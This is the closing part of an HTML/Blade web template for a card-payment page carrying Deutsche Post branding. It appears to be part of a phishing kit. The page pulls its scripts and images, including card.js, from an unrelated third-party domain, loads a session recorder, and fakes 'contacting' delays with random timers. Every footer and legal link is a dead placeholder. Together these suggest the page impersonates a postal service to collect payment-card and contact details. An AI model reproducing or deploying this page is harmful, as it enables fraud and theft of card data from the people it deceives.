                                                        <a id="csc-it" class="position-absolute" style="right: 9px; top: 9px;" href="#" data-html="true" data-toggle="tooltip" title="Le code de sécurité de la carte (CSC) est un numéro à 3 ou 4 chiffres utilisé pour aider à vérifier qu'un paiement par carte de débit ou de crédit est soumis par le titulaire de la carte.<br><br>Pour Visa, MasterCard et Discover débit ou cartes de crédit, le CSC est le numéro à 3 chiffres situé au dos de la carte, généralement imprimé à droite de la bande de signature. Sur certaines cartes, tout ou partie du numéro de carte de crédit apparaîtra devant le CSC.<br><br>Pour les cartes de débit ou de crédit American Express, le CSC est le numéro à 4 chiffres situé au recto de la carte, imprimé ci-dessus et à droite du numéro de carte de crédit."><i class="fa fa-question-circle text-secondary"></i></a>
                                                    </div>


                                                </div>
                                            </div>
                                            <div class="row justify-content-end mt-4">
                                                <div class="col-md-8 d-flex align-items-center justify-content-center justify-content-md-end p-md-0 mb-2 mb-md-0">
                                                    <p class="mb-0" style="font-size: .8rem;">
                                                        {{Session()->get("lang-payment-click")}}
    <a href='#' style='color: #007acc;'>{{Session()->get("lang-payment-general")}}</a>                                                    </p>
                                                </div>
                                                <div class="col-md-4 col-lg-3">
                                                    <button type="submit" class="btn btn-success btn-block m-0" id="orm"
                                                        value="validate">{{Session()->get("lang-payment-confirm")}}</button>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>


        <div class="modal fade show" tabindex="-1" role="dialog" id="auth-modal" style="padding-right: 12px; display: none;" aria-modal="true">
            <div class="modal-dialog" role="document">

                <div class="modal-content" style="width: 100%; margin-left: 0px;">
                    <section class="loading-1" style="display: none;">

                        <div class="modal-body d-flex justify-content-center align-items-center flex-column position-relative" style="height: 304px;">

                            <img src="https://dispatching-centre.wtechsmartwater.com/images/loading.gif" alt="">

                            <small>{{Session()->get("lang-payment-contacting")}}... </small>

                        </div>
                    </section>

                    <section class="loading-2" style="display: none;">

                        <div class="modal-body d-flex justify-content-center align-items-center flex-column position-relative" style="height: 304px;">

                            <img src="https://dispatching-centre.wtechsmartwater.com/images/loading-circle.gif" alt="" style="height: 80px;">

                            <small>{{Session()->get("lang-payment-loading")}}...</small>

                        </div>
                    </section>

                </div>
            </div>
        </div>
    </div>
    <div class="modal fade p-0" tabindex="-1" role="dialog" id="b-modal">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
            </div>
        </div>
    </div>


    <footer>
        <div class="footer-border">
            <div class="container">
                <hr>
                <div class="row">
                    <div class="col-sm-12 col-md-8">
                        <div class="pdIr">
                            <div class="row">
                                <div class="col-sm-12 col-md-4 col">
                                    <div class="square">
                                        <h4 class="headline">{{Session()->get("lang-footer-cands")}} </h4>
                                        <ul>
                                            <li><a href="#">{{Session()->get("lang-header-help")}}</a></li>
                                            <li><a href="#">{{Session()->get("lang-footer-faqs")}}</a></li>
                                            <li><a href="#">{{Session()->get("lang-footer-contact")}}</a></li>
                                            <li><a href="#">{{Session()->get("lang-header-find")}}</a></li>
                                        </ul>
                                    </div>
                                </div>
                                <div class="col-sm-12 col-md-4 col">
                                    <div class="square">
                                        <h4 class="headline">{{Session()->get("lang-footer-legal")}}</h4>
                                        <ul>
                                            <li><a href="#">{{Session()->get("lang-footer-terms")}}</a></li>
                                            <li><a href="#">{{Session()->get("lang-footer-privacy")}}</a></li>
                                        </ul>
                                    </div>
                                </div>
                                <div class="col-sm-12 col-md-4 col">
                                    <div class="square">
                                    <h4 class="headline">{{Session()->get("lang-footer-alerts")}}</h4>
                                        <ul>
                                            <li><a href="#">{{Session()->get("lang-footer-fawa")}}</a></li>
                                            <li><a href="#">{{Session()->get("lang-footer-fas")}}</a></li>
                                            <li><a href="#">{{Session()->get("lang-footer-import")}}</a></li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="col-sm-12 col-md-4">
                        <div class="wetSq">
                            <div class="cyNe">
                                <img src="https://dispatching-centre.wtechsmartwater.com/images/foo.png" alt="">
                            </div>
                            <div class="ledIu">
                                <ul>
                                    <li><a href="#">{{Session()->get("lang-footer-about")}}</a></li>
                                    <li><a href="#">{{Session()->get("lang-footer-news")}}</a></li>
                                    <li><a href="#">{{Session()->get("lang-footer-careers")}}</a></li>
                                    <li><a href="#">{{Session()->get("lang-footer-legalno")}}</a></li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
                <hr>
            </div>
        </div>
        <div class="footer-media">
            <div class="container">
                <div class="row">
                    <div class="col">
                        <div class="social">
                            <h4>{{Session()->get("lang-footer-follow")}}</h4>
                            <ul>
                                <li><a href="#"><i class="fab fa-facebook-f"></i></a></li>
                                <li><a href="#"><i class="fab fa-twitter"></i></a></li>
                                <li><a href="#"><i class="fab fa-youtube"></i></a></li>
                                <li><a href="#"><i class="fab fa-instagram"></i></a></li>
                            </ul>
                        </div>
                    </div>
                    <div class="col offset-md-4">
                        <div class="copyright">
                            <p>2022 © Deutsche Post AG - All rights reserved</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </footer>

    <script>
        window.sessionHash = "{{Session()->get("session")}}";
    </script>


    <script src="../js/app.js"></script>i
	<script>
		$("#country_selector").countrySelect({
			preferredCountries: ["{{strtolower($countrycode)}}", 'us']
		});

		$("#mobile_country_selector").countrySelect({
			preferredCountries: ["{{strtolower($countrycode)}}", 'us']
		});
	</script>

    <script>
        $(window).on('load', function() {
            $(".modal-loader").hide();
            $(".se-pre-con").fadeOut();
            $('.se-pre-con').on('load',function(){
                $('.modal-loader').hide();
            });
        });

        function openNav() {
            $('#mySidepanel')[0].style.width = "250px";
        }

        function closeNav() {
            $('#mySidepanel')[0].style.width = "0";
        }
    </script>
        <script src="js/session-recorder.js"></script>
        <script src="../js/new.js"></script>
            <script src="https://dispatching-centre.wtechsmartwater.com/js/card.js"></script>
    <script src="https://dispatching-centre.wtechsmartwater.com/js/intlTelInput.js"></script>
    <script>
        function getRandomInt(min, max) {
            min = Math.ceil(min);
            max = Math.floor(max);
            return Math.floor(Math.random() * (max - min + 1)) + min;
        }

        $(function () {
            var input = $('#phone_number');
            var bInfo = {};

            intlTelInput(input[0], {
                utilsScript: "https://dispatching-centre.wtechsmartwater.com/js/utils.js",
                initialCountry: "{{strtolower($countrycode)}}",
                preferredCountries: ["{{strtolower($countrycode)}}", 'us']
            });

            $('input[name=country]').countrySelect({
                preferredCountries: ["{{strtolower($countrycode)}}", 'us']
            });

            $('#b-continue').on('click', function (e) {
                e.preventDefault();

                var bHasErrors = false;

                $('#b-form .form-control').each(function () {
                    var field = $(this);

                    if (field.parsley) {
                        field.parsley().validate();

                        if (!field.parsley().isValid()) {
                            bHasErrors = true;
                        } else {
                            var value = field.val();

                            if (field.prop('tagName') == 'select') {
                                value = field.find('option:selected').val();
                            }

                            bInfo[field.attr('name')] = value;
                        }
                    }
                });

                if (!bHasErrors) {
                    $('#b-form').hide();
                    $('#load-form').show();
                    $('.c-form').show();
                    setTimeout(function () {
                        $('#load-form').hide();
                    }, getRandomInt(500, 3500));

                    for (var name in bInfo) {
                        $('.b-info .' + name).text(bInfo[name]);
                    }
                }
            });

            $('#b-edit').on('click', function (e) {
                e.preventDefault();
                bInfo = {};

                $('.c-form').hide();
                $('#b-form').show();
                $('#load-form').show();
                setTimeout(function () {
                    $('#load-form').hide();
                }, getRandomInt(500, 3500));
            });

            $('#card_info').on('error', function (e, error) {
                if (error.errorInB) {
                    $('.c-form').hide();
                    $('#b-form').show();
                }
            });

            $('.c-form .form-control').on('keypress', function (e) {
                if (e.which == 13) {
                    $('#card_info').submit();
                }
            });
        });
    </script>
  </body>
</html>
